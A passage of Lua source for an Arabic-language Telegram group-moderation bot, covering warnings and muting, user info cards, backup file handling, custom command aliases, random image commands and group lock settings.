{{text = 'SpaceTraveler', url="https://t.me/gamee?game=SpaceTraveler"},{text = 'RedAndBlue', url="https://t.me/gamee?game=RedAndBlue"}},  
{{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
{{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
{{text = '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°', url="t.me/eLmLoK0"}},
}  
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/timo_019/29&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--------------------------------------------------------------------------------------------------------------
if text == ("انذار") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) and not database:get(bot_id..'NightRang:inthar:group'..msg.chat_id_) then
function FunctionStatus(arg, result)
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ♤ عذرا لا تستطيع حظر ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
end
local numinthar = tonumber(database:get(bot_id.."NightRang:inthar"..msg.chat_id_..result.sender_user_id_) or 0)
if numinthar == 0 then
database:set(bot_id.."NightRang:inthar"..msg.chat_id_..result.sender_user_id_,'1')
send(msg,result.id_,"reply","تم اعطائه انذار \n تبقى له انذارين ويتم كتمه")  
elseif numinthar == 1 then
send(msg,result.id_,"reply","تم اعطائه انذار \n تبقى له انذار و يتم كتمه")  
database:set(bot_id.."NightRang:inthar"..msg.chat_id_..result.sender_user_id_,'2')
elseif numinthar == 2 then
send(msg,result.id_,"reply","تم كتمه \n لانه تجاوز حد 3 انذارات")  
database:del(bot_id.."NightRang:inthar"..msg.chat_id_..result.sender_user_id_)
database:sadd(bot_id.."Muted:User"..msg.chat_id_, result.sender_user_id_)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end
if text and text:match("^انذار @(.*)$") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) and not database:get(bot_id..'NightRang:inthar:group'..msg.chat_id_) then
local username = text:match("^انذار @(.*)$")
function FunctionStatus(arg, result)
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ♤ عذرا لا تستطيع حظر ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
end
local numinthar = tonumber(database:get(bot_id.."NightRang:inthar"..msg.chat_id_..result.sender_user_id_) or 0)
if numinthar == 0 then
database:set(bot_id.."NightRang:inthar"..msg.chat_id_..result.sender_user_id_,'1')
send(msg,result.id_,"reply","تم اعطائه انذار \n تبقى له انذارين ويتم كتمه")  
elseif numinthar == 1 then
send(msg,result.id_,"reply","تم اعطائه انذار \n تبقى له انذار و يتم كتمه")  
database:set(bot_id.."NightRang:inthar"..msg.chat_id_..result.sender_user_id_,'2')
elseif numinthar == 2 then
send(msg,result.id_,"reply","تم كتمه \n لانه تجاوز حد 3 انذارات")  
database:del(bot_id.."NightRang:inthar"..msg.chat_id_..result.sender_user_id_)
database:sadd(bot_id.."Muted:User"..msg.chat_id_, result.sender_user_id_)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end
if text and text:match("^انذار (%d+)$") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) and not database:get(bot_id..'NightRang:inthar:group'..msg.chat_id_) then
local userid = text:match("^انذار (%d+)$")
function FunctionStatus(arg, result)
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ♤ عذرا لا تستطيع حظر ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
end
local numinthar = tonumber(database:get(bot_id.."NightRang:inthar"..msg.chat_id_..result.sender_user_id_) or 0)
if numinthar == 0 then
database:set(bot_id.."NightRang:inthar"..msg.chat_id_..result.sender_user_id_,'1')
send(msg,result.id_,"reply","تم اعطائه انذار \n تبقى له انذارين ويتم كتمه")  
elseif numinthar == 1 then
send(msg,result.id_,"reply","تم اعطائه انذار \n تبقى له انذار و يتم كتمه")  
database:set(bot_id.."NightRang:inthar"..msg.chat_id_..result.sender_user_id_,'2')
elseif numinthar == 2 then
send(msg,result.id_,"reply","تم كتمه \n لانه تجاوز حد 3 انذارات")  
database:del(bot_id.."NightRang:inthar"..msg.chat_id_..result.sender_user_id_)
database:sadd(bot_id.."Muted:User"..msg.chat_id_, result.sender_user_id_)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end
if text == "معلوماتي" and not database:get(bot_id..'Bot:Id'..msg.chat_id_) then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 1)
local msg_id = msg.id_/2097152/0.5
local Text = "معلوماتك"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'رتبتك⇐'..rtp, url="t.me/"..data.username_}},
{{text = 'معرفك⇐'..data.username_,url="t.me/"..data.username_}},
{{text = 'ايديك⇐'..msg.sender_user_id_, url="t.me/"..data.username_}},
{{text = ' رسائلك⇐'..Msguser, url="t.me/"..data.username_}},
}
local function getpro(extra, result, success)
if result.photos_[0] then
https.request("https://api.telegram.org/bot"..token..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end,nil)
end
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
if text == 'رفع النسخه' and DevSoFi(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile_Bot(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end

if text == 'جلب النسخه' and DevSoFi(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
GetFile_Bot(msg)
end
if text == 'الاوامر المضافه' and Constructor(msg) then
local list = database:smembers(bot_id..'List:Cmd:Group:New'..msg.chat_id_..'')
t = " ♤ قائمه الاوامر المضافه  \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
Cmds = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..v)
print(Cmds)
if Cmds then 
t = t..""..k..">> ♤ '..v..' ♤  ⇦♤{"..Cmds.."}\n"
else
t = t..""..k..">> ♤ '..v..' ♤ \n"
end
end
if #list == 0 then
t = " ♤ لا يوجد اوامر مضافه"
end
send(msg.chat_id_, msg.id_,'['..t..']')
end
if text == 'مسح الاوامر المضافه' or text == 'مسح الاوامر المضافه' then
if Constructor(msg) then 
local list = database:smembers(bot_id..'List:Cmd:Group:New'..msg.chat_id_)
for k,v in pairs(list) do
database:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..v)
database:del(bot_id..'List:Cmd:Group:New'..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,' ♤ تم ازالة جميع الاوامر المضافه')  
end
end
if text == 'اضف امر' and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n ??♤ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_,'true') 
send(msg.chat_id_, msg.id_,' ♤ ارسل الامر القديم')  
return false
end
if text == 'مسح امر' or text == 'مسح امر' then 
if Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_,'true') 
send(msg.chat_id_, msg.id_,' ♤ ارسل الامر الذي قمت بوضعه بدلا عن القديم')  
return false
end
end
if text and database:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_) == 'true' then
database:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,' ♤ ارسل الامر الجديد')  
database:del(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_)
database:set(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_,'true1') 
return false
end
if text and database:get(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_) == 'true1' then
local NewCmd = database:get(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text,NewCmd)
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,' ♤ تم حفظ الامر')  
database:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_)
return false
end
--------------------------------------------------------------------------------------------------------------
if text == "المطور" or text == "مطور" then
local TEXT_SUD = database:get(bot_id..'Tshake:TEXT_SUDO')
if TEXT_SUDO then 
send(msg.chat_id_, msg.id_,TEXT_SUDO)
else
tdcli_function ({ID = "GetUser",user_id_ = SUDO,},function(arg,result) 
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '♤⇓𝙳𝙴𝚅 𝙽𝙴𝙼𝙴⇓♤\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
},
{
{text = 'أضفہ ألبہوتہ أليہ مہجہمہوعہتہكہ°' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Name)..'&photo='..taha.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
 end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = SUDO, offset_ = 0, limit_ = 1 }, taha, nil)
end,nil)
end
end
if text == "تويت بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,28); 
local Text ='مرحبا إليك تويت بالصور❤️🕊' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text =  '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°' ,url="t.me/eLmLoK0"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/wffhvv/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "لو خيروك بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then
ban = math.random(1,33); 
local Text ='مرحبا اليك لو خيروك بالصوره ❤️🕊' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text =  '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°' ,url="t.me/eLmLoK0"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SourceSaidi/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "انصحني بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,28); 
local Text ='مرحبا اليك انصحني بالصور ❤️??' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text =  '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°' ,url="t.me/eLmLoK0"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/TIMO_JABWA2/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "رمزيات ولاد" or text ==  "صور ولاد"  and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,62); 
local Text = 'تـم اخـتيار هـذه الـصوره لـك ❤️??'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text =  '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°' ,url="t.me/eLmLoK0"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/elmlok990/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "رمزيات بنات" or text ==  "صور بنات"  and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,62); 
local Text = 'تـم اخـتيار هـذه الـصوره لـك ❤️🕊'  
keyboard = {}  
keyboard.inline_keyboard = { 
{{text =  '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°' ,url="t.me/eLmLoK0"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/elmlokk0/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "مستقبلي" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
rob = math.random(1,14); 
local Text ='حـظـك شـبـه وشـك..😂💙' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text =  '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°' ,url="t.me/eLmLoK0"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/q_p_lli/'..rob..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "تفعيل الحمايه" and not database:get(bot_id..'GeId.result.custom_title'..msg.chat_id_) then     
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
if result.username_ then
username = result.username_ 
else
username = 'eLmLoK0'
end
local msg_id = msg.id_/2097152/0.5
local textt = ' تم تفعيل الحمايه بواسطه '..Rutba(msg.sender_user_id_,msg.chat_id_)
local Jabwa = 'https://t.me/Qtdao/71'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = textt, url= "https://t.me/"..result.username_..""},
},
}
local function getpro(extra, result, success) 
if result.photos_[0] then 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&photo=' .. URL.escape(textt).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=' .. URL.escape(JABWA).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end end 
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil) 
end,nil)
end
if text == "تعطيل الحمايه" and not database:get(bot_id..'GeId.result.custom_title'..msg.chat_id_) then     
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
if result.username_ then
username = result.username_ 
else
username = 'eLmLoK0'
end
local msg_id = msg.id_/2097152/0.5
local textt = ' تم تعطيل الحمايه بواسطه '..Rutba(msg.sender_user_id_,msg.chat_id_)
local Jabwa = 'https://t.me/Qtdao/71'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = textt, url= "https://t.me/"..result.username_..""},
},
}
local function getpro(extra, result, success) 
if result.photos_[0] then 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&photo=' .. URL.escape(textt).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=' .. URL.escape(Jabwa).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end end 
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil) 
end,nil)
end
if text == 'تفعيل الحمايه القصوه'and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:text"..msg.chat_id_,true) 
database:set(bot_id.."lock:AddMempar"..msg.chat_id_,'kick')
database:set(bot_id.."lock:Join"..msg.chat_id_,'kick')
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'kick')
database:set(bot_id.."lockpin"..msg.chat_id_, true) 
database:sadd(bot_id..'lock:pin',msg.chat_id_) 
database:set(bot_id..'lock:tagservr'..msg.chat_id_,true)  
database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
database:set(bot_id..'lock:Fshar'..msg.chat_id_,true)
database:set(bot_id..'lock:edit'..msg.chat_id_,true) 
database:set(bot_id.."lock:inline"..msg.chat_id_,'del')
database:set(bot_id.."lock:Lock:Sexy"..msg.chat_id_,'del')
database:del(bot_id.."pp_photo:status"..msg.chat_id_) 
database:del(bot_id.."my_photo:status"..msg.chat_id_) 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'keed')  
database:set(bot_id.."lock:Contact"..msg.chat_id_,'ked')  
database:set(bot_id.."lock:Spam"..msg.chat_id_,'ked')  
database:set(bot_id.."lock:forward"..msg.chat_id_,'ked')  
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'ked')  
database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true) 
database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true) 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'ked')  
database:set(bot_id.."lock:geam"..msg.chat_id_,'ked')  
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'تم قفل الحمايه كامله\nتحظير هذا الحمايه تقفل كل حاجه بلتقييد\nتفعيل الحمايه دي بس عند التفليش او التحفيل\nلتعطيل الحمايه القصوه\nاكتب تعطيل الحمايه القوصه\n تم تفعيل الحمايه القصوه من قبل [♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..')  ')
end,nil)   
end
if text == 'تعطيل الحمايه القصوه'and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Spam"..msg.chat_id_)  
database:del(bot_id.."lock:Join"..msg.chat_id_)  
database:del(bot_id.."lock:text"..msg.chat_id_)  
database:del(bot_id.."lock:AddMempar"..msg.chat_id_)  
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
database:del(bot_id..'lock:edit'..msg.chat_id_)
database:del(bot_id.."lockpin"..msg.chat_id_)  
database:del(bot_id..'lock:Fshar'..msg.chat_id_) 
database:del(bot_id..'lock:Fars'..msg.chat_id_) 
database:del(bot_id.."lock:Link"..msg.chat_id_)  
database:del(bot_id..'sing:for:me'..msg.chat_id_)  
database:del(bot_id.."lock:Photo"..msg.chat_id_)  
database:del(bot_id.."lock:Video"..msg.chat_id_)  
database:del(bot_id.."lock:Sticker"..msg.chat_id_)  
database:del(bot_id.."lock:forward"..msg.chat_id_)  
database:del(bot_id.."lock:geam"..msg.chat_id_)  
database:del(bot_id..'Bot:Id:Photo'..msg.chat_id_) 
database:set(bot_id.."pp_photo:status"..msg.chat_id_,true) 
database:set(bot_id.."my_photo:status"..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'  تم تعطيل الحمايه القصوه من قبل    [♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..')  ')
end,nil)   
end
if text == 'قفل الدردشه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id.."lock:text"..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الدردشه ')
end,nil)   
elseif text == 'قفل الاضافه' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:AddMempar"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل اضافة ')
end,nil)   
elseif text == 'قفل الدخول' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Join"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل دخول ')
end,nil)   
elseif text == 'قفل البوتات' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل البوتات ')
end,nil)   
elseif text == 'قفل البوتات بالطرد' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل البوتات بالطرد ')
end,nil)   
elseif text == 'قفل الاشعارات' and msg.reply_to_message_id_ == 0 and Mod(msg) then  
database:set(bot_id..'lock:tagservr'..msg.chat_id_,true)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الاشعارات ')
end,nil)   
elseif text == 'قفل التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id.."lockpin"..msg.chat_id_, true) 
database:sadd(bot_id..'lock:pin',msg.chat_id_) 
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,data.pinned_message_id_)  end,nil)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل التثبيت ')
end,nil)   
elseif text == 'قفل التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id..'lock:edit'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل تعديل ')
end,nil)   
elseif text == 'قفل السب' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Fshar'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل السب ')
end,nil)  
elseif text == 'قفل الازعاج' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Azag'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل السب ')
end,nil)  
elseif text == 'قفل الفارسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الفارسيه ')
end,nil)   
elseif text == 'قفل الانكليزيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Engilsh'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الانكليزيه ')
end,nil)
